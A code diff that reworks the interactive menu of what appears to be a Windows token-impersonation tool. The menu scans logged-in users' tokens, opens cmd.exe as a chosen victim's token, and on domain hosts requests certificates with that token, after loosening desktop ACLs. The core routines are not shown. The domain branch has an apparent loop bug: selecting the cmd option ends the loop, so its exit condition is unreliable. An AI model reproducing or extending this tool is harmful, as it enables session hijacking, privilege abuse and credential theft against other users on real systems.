@@ -183,7 +183,6 @@ std::string GetUserDnsDomain() {
             }
         }
     }
-    wprintf(L"[!] GetUserDnsDomain: Could not parse domain from 'set USERDNSDOMAIN' output.\n");
     return "";
 }
 
@@ -1100,108 +1099,170 @@ int wmain(int argc, wchar_t* argv[]) {
      
     }
    
-
     // Add a 3-second delay
     std::this_thread::sleep_for(std::chrono::seconds(3));
 
   
 
     if (!ACL_Change::AdjustDesktop()) {
-
         wprintf(L"[!] Failed to adjust desktop ACLs (Error: %S). CreateProcessAsUser may fail interaction.\n", ACL_Change::GetLastErrorAsString().c_str());
+    }
+
+
+    if (g_userDnsDomain.empty()) {
+        int choice = 0;
+        do {
+            // Display Menu
+            std::wcout << L"\n--- Menu ---" << std::endl;
+            std::wcout << L"1. Scan and Display Interactive User Tokens" << std::endl;
+            std::wcout << L"2. Open cmd.exe" << std::endl;
+            std::wcout << L"3. Exit" << std::endl;
+            std::wcout << L"Enter your choice: ";
+
+            // Get Input
+            std::wcin >> choice;
+
+            // Input Validation
+            if (std::wcin.fail()) {
+                std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
+                ClearInputBuffer();
+                choice = 0;
+                continue;
+            }
+            ClearInputBuffer();
+
+
+            std::this_thread::sleep_for(std::chrono::seconds(5));
+
+            // Process Choice
+            switch (choice) {
+            case 1:
+                CleanupTokenHandles();
+                if (DiscoverAndStoreTokens()) {
+                    DisplayTokenList();
+                }
+                else {
+                    std::wcout << L"[-] Token discovery failed." << std::endl;
+                }
+                break;
+
+            case 2:
+                if (g_discoveredTokens.empty()) { std::wcout << L"[!] No tokens discovered..." << std::endl; }
+                else {
+                    int selectedId = 0; std::wcout << L"\n[*] Enter Token ID to open CMD with: "; std::wcin >> selectedId; if (std::wcin.fail()) { std::wcout << L"[!] Invalid ID." << std::endl; ClearInputBuffer(); }
+                    else {
+                        ClearInputBuffer();
+
+                        const TOKEN* pSelectedTokenCmd = nullptr;
+                        for (const auto& token : g_discoveredTokens) { if (token.DisplayId == selectedId) { pSelectedTokenCmd = &token; break; } }
+                        if (pSelectedTokenCmd == nullptr) { wprintf(L"[!] Error: Token ID %d not found.\n", selectedId); }
+                        else { OpenCmdAsToken(*pSelectedTokenCmd); }
+                    }
+                }
+                break;
+
+            case 3:
+                std::wcout << L"[*] Exiting..." << std::endl;
+                break;
+
+            default:
+                std::wcout << L"[!] Invalid choice. Please try again." << std::endl;
+            }
+
+
+            std::this_thread::sleep_for(std::chrono::seconds(4));
+
+        } while (choice != 3);
 
     }
     else {
-        wprintf(L"[*] Successfully adjusted desktop ACLs (or already correct).\n");
-    }
 
+        int choice = 0;
+        do {
+            // Display Menu
+            std::wcout << L"\n--- Menu ---" << std::endl;
+            std::wcout << L"1. Scan and Display Interactive User Tokens" << std::endl;
+            std::wcout << L"2. Request Certificate for Selected Token ID" << std::endl;
+            std::wcout << L"3. Open cmd.exe" << std::endl;
+            std::wcout << L"4. Exit" << std::endl;
+            std::wcout << L"Enter your choice: ";
 
+            // Get Input
+            std::wcin >> choice;
 
-    int choice = 0;
-    do {
-        // Display Menu
-        std::wcout << L"\n--- Menu ---" << std::endl;
-        std::wcout << L"1. Scan and Display Interactive User Tokens" << std::endl;
-        std::wcout << L"2. Request Certificate for Selected Token ID" << std::endl;
-        std::wcout << L"3. Open cmd.exe" << std::endl;
-        std::wcout << L"4. Exit" << std::endl;
-        std::wcout << L"Enter your choice: ";
-
-        // Get Input
-        std::wcin >> choice;
-
-        // Input Validation
-        if (std::wcin.fail()) {
-            std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
+            // Input Validation
+            if (std::wcin.fail()) {
+                std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
+                ClearInputBuffer();
+                choice = 0;
+                continue;
+            }
             ClearInputBuffer();
-            choice = 0;
-            continue;
-        }
-        ClearInputBuffer();
 
 
-        std::this_thread::sleep_for(std::chrono::seconds(5));
+            std::this_thread::sleep_for(std::chrono::seconds(5));
 
-        // Process Choice
-        switch (choice) {
-        case 1:
-            CleanupTokenHandles();
-            if (DiscoverAndStoreTokens()) {
-                DisplayTokenList();
-            }
-            else {
-                std::wcout << L"[-] Token discovery failed." << std::endl;
-            }
-            break;
-
-        case 2: // Request Certificate
-            if (g_discoveredTokens.empty()) {
-                std::wcout << L"[-] No tokens discovered. Please Scan first (Option 1)." << std::endl;
-            }
-            else {
-                int selectedId = 0;
-                std::wcout << L"\n[*] Enter the ID of the token to use for certificate request: ";
-                std::wcin >> selectedId;
-
-                if (std::wcin.fail()) {
-                    std::wcout << L"[-] Invalid input. Please enter a number for the ID." << std::endl;
-                    ClearInputBuffer();
+            // Process Choice
+            switch (choice) {
+            case 1:
+                CleanupTokenHandles();
+                if (DiscoverAndStoreTokens()) {
+                    DisplayTokenList();
                 }
                 else {
-                    ClearInputBuffer();
-                    RequestCertificateForToken(selectedId);
+                    std::wcout << L"[-] Token discovery failed." << std::endl;
                 }
-            }
-            break;
-        case 3:
-            if (g_discoveredTokens.empty()) { std::wcout << L"[!] No tokens discovered..." << std::endl; }
-            else {
-                int selectedId = 0; std::wcout << L"\n[*] Enter Token ID to open CMD with: "; std::wcin >> selectedId; if (std::wcin.fail()) { std::wcout << L"[!] Invalid ID." << std::endl; ClearInputBuffer(); }
+                break;
+
+            case 2: // Request Certificate
+                if (g_discoveredTokens.empty()) {
+                    std::wcout << L"[-] No tokens discovered. Please Scan first (Option 1)." << std::endl;
+                }
                 else {
-                    ClearInputBuffer();
-            
-                    const TOKEN* pSelectedTokenCmd = nullptr;
-                    for (const auto& token : g_discoveredTokens) { if (token.DisplayId == selectedId) { pSelectedTokenCmd = &token; break; } }
-                    if (pSelectedTokenCmd == nullptr) { wprintf(L"[!] Error: Token ID %d not found.\n", selectedId); }
-                    else { OpenCmdAsToken(*pSelectedTokenCmd); } 
+                    int selectedId = 0;
+                    std::wcout << L"\n[*] Enter the ID of the token to use for certificate request: ";
+                    std::wcin >> selectedId;
+
+                    if (std::wcin.fail()) {
+                        std::wcout << L"[-] Invalid input. Please enter a number for the ID." << std::endl;
+                        ClearInputBuffer();
+                    }
+                    else {
+                        ClearInputBuffer();
+                        RequestCertificateForToken(selectedId);
+                    }
                 }
+                break;
+            case 3:
+                if (g_discoveredTokens.empty()) { std::wcout << L"[!] No tokens discovered..." << std::endl; }
+                else {
+                    int selectedId = 0; std::wcout << L"\n[*] Enter Token ID to open CMD with: "; std::wcin >> selectedId; if (std::wcin.fail()) { std::wcout << L"[!] Invalid ID." << std::endl; ClearInputBuffer(); }
+                    else {
+                        ClearInputBuffer();
+
+                        const TOKEN* pSelectedTokenCmd = nullptr;
+                        for (const auto& token : g_discoveredTokens) { if (token.DisplayId == selectedId) { pSelectedTokenCmd = &token; break; } }
+                        if (pSelectedTokenCmd == nullptr) { wprintf(L"[!] Error: Token ID %d not found.\n", selectedId); }
+                        else { OpenCmdAsToken(*pSelectedTokenCmd); }
+                    }
+                }
+                break;
+
+            case 4:
+                std::wcout << L"[*] Exiting..." << std::endl;
+                break;
+
+            default:
+                std::wcout << L"[!] Invalid choice. Please try again." << std::endl;
             }
-            break;
-
-        case 4:
-            std::wcout << L"[*] Exiting..." << std::endl;
-            break;
-
-        default:
-            std::wcout << L"[!] Invalid choice. Please try again." << std::endl;
-        }
-
-  
-        std::this_thread::sleep_for(std::chrono::seconds(4));
-
-    } while (choice != 3);
 
 
+            std::this_thread::sleep_for(std::chrono::seconds(4));
+
+        } while (choice != 3);
+
+    }
+    
     CleanupTokenHandles();
     return 0;
 }
